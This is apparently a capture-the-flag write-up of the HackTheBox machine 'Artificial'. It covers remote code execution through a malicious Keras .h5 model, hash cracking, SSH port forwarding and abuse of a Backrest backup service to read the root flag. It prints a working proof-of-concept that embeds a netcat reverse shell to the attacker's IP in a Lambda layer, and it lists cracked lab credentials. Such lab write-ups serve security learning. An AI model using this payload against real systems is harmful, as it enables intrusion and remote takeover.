## Overview
**Artificial** is an Easy Linux machine from HackTheBox that demonstrates the dangers of accepting user uploaded machine learning models. The path to root involves exploiting a TensorFlow remote code execution vulnerability, database credential extraction, and abusing a backup service to read the root flag.

## Reconnaissance

First Thing to do as always i launched an nmap scan to identify open services. The results revealed just SSH on port 22 and an HTTP server on port 80.


```bash

The web server caught my attention, After adding this to my `/etc/hosts` file, I navigated to the website.

## Web Application: A Machine Learning Platform

The landing page presented an interesting web application focused on machine learning model hosting. After registering an account and login i was redirected to the main page.

![Website homepage](/blog/images/htb_artificial/image.png)

The platform featured a file upload functionality specifically designed for machine learning models. What made this particularly interesting was the accepted file format: `.h5` files, which are Keras model files.

![File upload page](/blog/images/htb_artificial/image-1.png)

Exploring further, I discovered downloadable files that revealed crucial information about the backend infrastructure - a `Dockerfile` and `requirements.txt`. These files exposed the technology stack in use:

**requirements.txt:**
```
tensorflow-cpu==2.13.1
```

**Dockerfile:**
```dockerfile
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

The specific TensorFlow version immediately set off alarm bells. I knew that accepting user-uploaded model files could be dangerous, especially with specific versions that might have known vulnerabilities.

---

## Exploitation

After some research, I discovered a critical vulnerability: TensorFlow Remote Code Execution through malicious model files. The vulnerability allows arbitrary code execution when a crafted `.h5` model is loaded.

**Reference:** https://mastersplinter.work/research/tensorflow-rce/

I crafted a proof of concept that would give me a reverse shell upon model loading:

**poc.py:**
```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.56 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

The tricky part? Getting the exact environment match. My initial attempts in a local virtual environment failed, even with the exact version from `requirements.txt`. The solution was to replicate the production environment precisely using the provided Dockerfile.

I spun up a Docker container with the exact configuration and compiled the malicious model inside:

![Compiling exploit in Docker](/blog/images/htb_artificial/image-2.png)

With the weaponized `exploit.h5` file in hand, I extracted it from the container and prepared for deployment.

---

## Initial Access: Triggering the Payload

I uploaded the malicious model through the web interface:

![Uploading malicious model](/blog/images/htb_artificial/image-3.png)

With my netcat listener ready on port 4444, I triggered the model execution:

![Triggering model execution](/blog/images/htb_artificial/image-4.png)

Success! The reverse shell connected back to my machine:

![Reverse shell obtained](/blog/images/htb_artificial/image-5.png)

I was in, but as a low-privileged user. Time to escalate.

## Lateral Movement: Finding User Credentials

Exploring the filesystem, I discovered a SQLite database in the `/instance` directory. This database contained user credentials - a goldmine for lateral movement.

Inside, I found a hash for user `gael`:
```
c99175974b6e192936d97224638a34f8
```

This MD5 hash cracked easily using hashcat:

**Credentials:**
- Username: `gael`  
- Password: `mattp005numbertwo`

I switched to the `gael` user and gained proper shell access via SSH for better stability.

## Privilege Escalation: The Path to Root

After stabilizing my access, I checked my group memberships and noticed something interesting:

![User groups](/blog/images/htb_artificial/image-7.png)

The `sysadm` group stood out. I immediately searched for files accessible by this group:

![Finding sysadm files](/blog/images/htb_artificial/image-8.png)

And GG! A backup file at `/var/backups/backrest_backup.tar.gz` was readable by the `sysadm` group. I downloaded this archive to my local machine for analysis.

### Analyzing the Backup

Extracting the backup revealed the source code and configuration for a backup service called "Backrest". While digging through the `.config` directory, I found what appeared to be a base64-encoded bcrypt hash:

```
JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP
```

After decoding i got this which seems like a bcrypt hash 

```
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```

after cracking, I obtained the password for `backrest_root`:
```
!@#$%^
```

### Discovering the Hidden Service

Examining `install.sh` within the backup revealed that Backrest runs a web interface on port `9898`, but only on localhost. This explained why I hadn't seen it during my initial port scan.

To access this service, I set up SSH port forwarding:
```bash
ssh -L 9898:127.0.0.1:9898 gael@artificial.htb
```

Now I could access the Backrest interface from my browser at `http://localhost:9898`.

![Backrest login](/blog/images/htb_artificial/image-9.png)

Logging in with `backrest_root:!@#$%^`, I gained access to the backup management interface.

### Exploiting Backrest for Root Access

The Backrest interface allowed me to create backup repositories and plans. More importantly, it could backup and restore arbitrary files on the system. Since the service likely ran as root (as backup services typically do), this was my ticket to reading the root flag.

**Step 1:** I created a new backup repository:

![Creating repository](/blog/images/htb_artificial/image-11.png)

**Step 2:** I created a backup plan targeting `/root/root.txt`:

![Creating backup plan](/blog/images/htb_artificial/image-12.png)

**Step 3:** I executed the backup:

![Executing backup](/blog/images/htb_artificial/image-13.png)

**Step 4:** I performed a restore operation to extract the backed-up files:

![Starting restore](/blog/images/htb_artificial/image-14.png)
![Restore in progress](/blog/images/htb_artificial/image-15.png)

**Step 5:** Finally, I downloaded the backup archive containing the root flag:

![Downloading archive](/blog/images/htb_artificial/image-16.png)

Extracting the archive revealed the coveted root flag:

## Conclusion

The "Artificial" machine provided an excellent learning experience showcasing:

1. **Supply Chain Vulnerabilities**: The danger of accepting user-uploaded models in ML applications
2. **Environment Replication**: How vulnerability exploitation often requires precise environment matching
3. **Credential Discovery**: Finding sensitive data in databases and configuration files
4. **Group Privileges**: Leveraging group memberships for information disclosure
5. **Service Enumeration**: Discovering internal services through configuration analysis
6. **Privilege Escalation**: Abusing backup service functionality to read privileged files

This box emphasizes the importance of validating all user inputs, even seemingly innocuous files like ML models, and highlights how backup services can become attack vectors when improperly secured.
